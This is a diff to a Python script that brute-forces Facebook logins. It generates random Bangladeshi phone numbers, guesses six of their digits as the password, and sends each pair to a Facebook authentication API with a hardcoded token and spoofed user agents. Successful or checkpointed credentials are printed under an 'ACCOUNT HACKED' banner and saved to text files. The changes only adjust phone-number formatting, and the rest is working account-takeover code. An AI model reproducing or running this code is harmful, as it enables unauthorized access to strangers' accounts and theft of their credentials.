@@ -79,7 +79,7 @@ def logger():
         use1 = 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck', 'Google chrome', 'Fire fox'
         header = random.choice(use1)
         number = str(random.randint(1, 9999999))
-        full = "+880" + adder + number + "\n"
+        full = "0" + adder + number + "\n"
         lol = str(full)
         digi6 = lol[5:11]
         br.set_handle_referer(True)
@@ -88,23 +88,23 @@ def logger():
         br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
         sys.stdout.flush()
         br.addheaders = [('User-agent', header)]
-        result = lol + "||" + digi6 + "\n\n"
+        result = "+88"+lol + "||" + digi6 + "\n\n"
 #        if content == 'https://www.facebook.com' or content!='https://www.facebook.com/checkpoint/?next' or content == 'https://www.facebook.com' :
         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + lol + '&locale=en_US&password=' + digi6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
         a = json.load(data)
         if 'access_token' in a:
-            result = lol + "||" + digi6 + "\n\n"
+            result ="+88"+lol + "||" + digi6 + "\n\n"
             print(f"\n\n{bcolors.BOLD}{bcolors.OKGREEN}[+] ACCOUNT HACKED = {bcolors.ENDC}",end="")
-            print(lol)
+            print("+88"+lol)
             print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Password Find = {bcolors.ENDC}",end="")
             print(digi6)
             filer = open("successfull.txt","a")
             wrote= filer.write(result)
             filer.close()
         elif 'www.facebook.com' in a['error_msg']:
-            result = lol + "||" + digi6 + "\n\n"
+            result = "+88"+lol + "||" + digi6 + "\n\n"
             print(f"\n\n{bcolors.BOLD}{bcolors.OKCYAN}[+] Open After 7 days[Checkpoint] = {bcolors.ENDC}", end="")
-            print(lol,end="")
+            print("+88"+lol,end="")
             print(f"{bcolors.BOLD}{bcolors.OKCYAN} || {bcolors.ENDC}",end="")
             print(digi6)
             file = open("checkpoint.txt", "a")
